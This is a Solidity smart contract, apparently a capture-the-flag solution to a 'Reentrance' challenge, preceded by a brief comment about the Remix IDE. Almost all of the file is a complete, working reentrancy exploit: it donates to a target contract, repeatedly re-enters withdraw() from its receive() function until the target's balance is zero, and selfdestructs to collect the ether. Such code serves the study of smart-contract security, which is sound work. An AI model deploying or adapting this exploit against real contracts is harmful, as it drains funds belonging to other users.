/*
    Kind of a confusing one, idea was damn clear, just remix was really creating some problem in doing this task, anyways don't always trust the remix IDE
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IReentrance {
    function donate(address) external payable;
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
}

contract ReentranceHack {
    IReentrance private immutable reentrance;

    constructor(address _reentrance) {
        reentrance = IReentrance(_reentrance);
    }

    // Send 0.001 ether and withdraw immediately
    // This will trigger the receive function when withdraw() is called on Reentrance contract
    function hack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        // This will trigger the receive() the function
        reentrance.withdraw(msg.value);

        require(address(reentrance).balance == 0, "FAILED!!!");

        // Recover sent ether
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 balance = reentrance.balanceOf(address(this));

        // Try to withdraw the smallest amount possible, so that the transaction does not revert
        uint256 withdrawableAmount = balance < 0.001 ether
            ? balance
            : 0.001 ether;

        // Stop withdrawing if the contract balance is 0, so that the transaction does not revert
        if (withdrawableAmount > 0) {
            reentrance.withdraw(withdrawableAmount);
        }
    }
}